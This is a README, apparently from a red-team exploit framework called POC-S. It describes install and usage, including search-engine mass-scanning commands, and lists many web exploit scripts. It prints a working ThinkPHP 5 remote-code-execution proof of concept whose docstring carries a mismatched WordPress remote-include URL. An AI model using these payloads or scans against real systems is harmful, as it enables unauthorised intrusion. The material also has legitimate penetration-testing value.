# POC-S: *POC-T Strengthen Version POC-T加强版* 

前言: 为了在红蓝对抗中快速获取入口权限，需要对一些常见的Web类应用进行漏洞验证，POC-T是一个很好的poc利用框架，但其功能和poc还不满足实际的渗透环境，因此本工具会对POC-T进行功能加强，根据VulHub的漏洞靶场环境添加完善一些实用的POC, 常见红蓝实战当中的Web应用可以参考 https://github.com/klionsec/RedTeamer 当中列举出的Web应用，本工具的POC也会参考其中以获取更高效可利用的POC.

## 法律免责声明
未经事先双方同意，使用POC-S攻击目标是非法的。
POC-S仅用于安全测试目的

## 特点
- 兼容POC-T的语法
- 良好的poc分类，灵活的poc加载方式，支持单文件，批量，任意目录的加载方式
- 提供pocs/poc-s终端命令，让框架和poc分离，可以将自定义的poc放在任意目录
- 提供良好的单元测试脚本

TODO
- [ ] 根据vulhub靶机及开源项目收集和完善POC, 具体可以看我的POC分类
- [ ] 添加pocsapi.py, 类似sqlmapapi的功能
- [ ] 增加py3版本的POC-S

POC-T的wiki文档请看doc目录

## 使用 
> 由于第三方接口需要认证，您需要在/pocs目录下(pip安装需要到对应目录下) 的tookit.conf配置文件中预先设置好您的API-KEY。如无预配置，程序将在运行时提示您输入API-KEY。

	pip install pocs

源码安装: 

```
	git clone https://github.com/jiangsir404/POC-S.git
	python setup.py install
```

> 如果pip按照pcos出现Some files missing的报错，则需要去到pocs的安装目录(python2.7\Lib\site-packages\pocs)重命名tookit.conf.

1. 更加灵活的插件加载方式

```
pocs -s test/test2.py -iS 127.0.0.1 #加载script/test/test2.py脚本
pocs -s test2 -iS 127.0.0.1 # 加载script/test2.py脚本

pocs -b test -iS 127.0.0.1 # 批量加载/script/test目录下的所有脚本
pocs -b test -s test2.py -iS 127.0.0.1 #加载script/test/test2.py脚本

pocs -s myself_script.py -iS 127.0.0.1 # 加载自定义的脚本和脚本目录
pocs -b mydir -iS 127.0.0.1
```

2. 搜索引擎的利用
```
pocs -b redis -t 50 -aZ "port:6379" --limit 50 -o res.txt
pocs -s test2.py -aZ "ThinkPHP"
```

利用ZoomEye批量搜索CNVD-2020-10487 tomcat ajp lfi漏洞

	pip install pocs==1.3
	pocs -b apache -aZ "app:tomcat" --limit 50 -t 30 -o ajp.txt

![](test.png)

3. 单元测试脚本请看test目录下


## POC
pocs 提供更加灵活的插件分类方式，目前收集到的总结有四类POC: Fuzz POC, OWASP POC, Vuln POC, Tool POC.  POC这块会尽量收集一些github上面已有的POC, 但不会太多，还是需要个人自己去收集整理。

POC的编写会尽可能的规范，以thinkphp-5-rce.py 的poc为例, 编写的所有的poc都差不多是类似的格式:
```
#!/usr/bin/env python		
#coding:utf-8

"""
ThinkPHP5 <=5.0.22/<=5.1.29 远程代码执行漏洞

Desc
    2018年12月10日中午，thinkphp官方公众号发布了一个更新通知，包含了一个5.x系列所有版本存在被getshell的高风险漏洞。
    由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，
    受影响的版本包括5.0.23和5.1.31之前的所有版本，推荐尽快更新到最新版本。
Version
	ThinkPHP5.0 版本 <= 5.0.22 ThinkPHP5.1 版本 <= 5.1.29
Usage:
	1. python POC-S.py -s 
	2. POC: /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://lj.s7star.cn/info.txt
Referer
	https://www.seebug.org/vuldb/ssvid-9771
"""

import requests

def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')
    payloads = [
        r"/index.php?s=index/\think\view\driver\Php/display&content=<?php%20phpinfo();?>",
        r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'"
    ]
    for payload in payloads:
        vulnurl = url + payload
        try:
            res = requests.get(vulnurl)
            if "allow_url_fopen" in res.text:
                return True
        except Exception as e:
            print(e)
    return False


if __name__ == "__main__":
    print poc("http://192.168.218.145:8080/")
```
  
### Vuln POC
主要来源于vulhub的插件编写 以及 POC-T自带的插件poc

- [ ] apache
	- [x] CNVD-2020-10487 tomcat-ajp-lfi.py

- [ ] thinkphp
	- [x] 5-rce
	- [x] 5.0.23-rce

- [ ] struts2
    - [x] s2-005.py
    - [x] s2-015.py
    - [x] s2-016.py
    - [x] s2-032.py
    - [x] s2-045.py
    - [x] s2-052.py
    - [x] s2-053.py
    - [x] s2-058.py
    - [x] struts2-devmode.py
	
- [ ] weblogic
	- [x] weblogic-ssrf-netmap.py
	- [ ] weblogc_wls_rce.py
	- [ ] weblogic_upload.py
	- [ ] web

- [ ] spring
	- [x] spring-oauth2-rce.py

- [ ] unauth
	- [x] redis-unauth.py
	- [x] mongodb-unauth.py
	- [x] memcached-unauth.py
	- [x] elasticsearch-unauth.py
	- [x] kubernetes-unauth.py
	- [x] jenkins-unauth.py
	- [ ] docker-unauth-rce.py
	- [ ] hadoop-unauth.py

- [ ] supervisor
	- [x] supervisord-RCE-CVE-2017-11610.py

- [ ] weakpass
	- [ ] mysql
	- [ ] redis
	- [ ] mongo
	- [ ] sqlserver
	- [ ] ftp
	- [ ] telent
	- [ ] web弱口令(通用无验证码后台)
	- [ ] http-basic-auth
	- [ ] coremail
	...

- [ ] phpmyadmin
	- [x] phpmyadmin-auth-rce.py
	- [ ] phpmyadmin4.8.1-RFI.py

- [ ] kibana
	- cve-2019-7609
	- cve-2018-17246

- [ ] php
	- [x] fpm-rce.py
	- [ ] CVE-2019-11043
	- [ ] CVE-2018-19518

- [ ] discuz
	- [ ] x3.4-arbitrary-file-deletion

- [ ] zabbix
	- [x] zabbix-jsrpc-mysql-exp.py
	- [x] zabbix-jsrpc-sqli.py
	- [x] zabbix-weakpass.py
	- [x] zabbix_latest_sqli.py

- [x] dns-zone-transfer

- [ ] confluence
	- [x] confulence-traversal.py
	- [ ] confluence 路径穿越与命令执行漏洞


### Fuzz POC
来源: boy-hack/POC-T

- bakfile: 备份文件检测
- crossdomain: crossdomain
- dzxss 
- gitleak
- issparse
- ms15-034
- phpinfo
- phpmyadmin
- svnleak
- swf
- tomcat_xmlleak
- wordspace

### OWASP POC
来源hunter的检测脚本

- [ ] cmd_exec
- [ ] sql_injection
- [ ] xss
- [ ] xxe
- [ ] csrf
- [ ] jsonp_xss
- [ ] jsonp_hijacking
- [ ] file_read
- [ ] ssti
- [ ] ssrf


### Tool Poc
一些常见的工具类POC, 提供搜索引擎，信息查询等功能

- bing-dork bing 搜索
- bingc 基于Bing搜索引擎的 IP反查域名, C段域名
- google-dork google搜索
- cdn-detect cdn检测
- waf 检测waf 并返回没有waf的url
- craw 爬取链接中的相关地址
- vulscan 检测sql注入漏洞
- portscan 端口扫描，检测弱口令服务
- [ ] domain2ip 域名查询ip
- [ ] whois 查询whois信息
- [ ] icp icp查询


其他开源的POC比如https://github.com/boy-hack/airbug 项目收集了一些poc可以直接使用，但有一个HackReqeust库是py3的，需要改一下成Python2的， 可以直接安装我改过后的py2库:https://github.com/jiangsir404/hack-requests 

